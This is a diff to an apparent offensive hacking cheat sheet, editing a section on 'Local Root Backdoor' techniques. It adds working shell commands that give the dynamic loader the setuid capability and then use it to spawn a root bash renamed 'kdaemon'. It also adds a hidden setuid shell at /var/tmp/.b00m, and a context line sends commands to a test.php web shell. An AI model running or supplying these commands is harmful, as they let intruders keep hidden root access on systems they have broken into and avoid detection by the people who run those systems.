@@ -1626,18 +1626,30 @@ curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 <a id="ld-backdoor"></a>
 **6.v. Local Root Backdoor**
 
-Stay root once you got root
+***1. Backdooring the dynamic loader with setcap
+
 ```bash
+### Execute as ROOT user
 fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
 setcap cap_setuid+ep "${fn}"
 ```
-Become root
+
 ```bash
-### Execute as non-root user
+### Execute as non-root user to get root
 fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
 p="python"
 command -v python3 >/dev/null && p="python3"
-exec "${fn:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
+exec "${fn:?}" "$p" -c 'import os;os.setgid(0);os.setuid(0);os.execlp("bash", "kdaemon")'
+```
+
+***2. Good old b00m shell
+
+```shell
+{ cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m; } 2>/dev/null >/dev/null
+```
+
+```shell
+exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setgid(0);os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
 ```
 
 <a id="implant"></a>
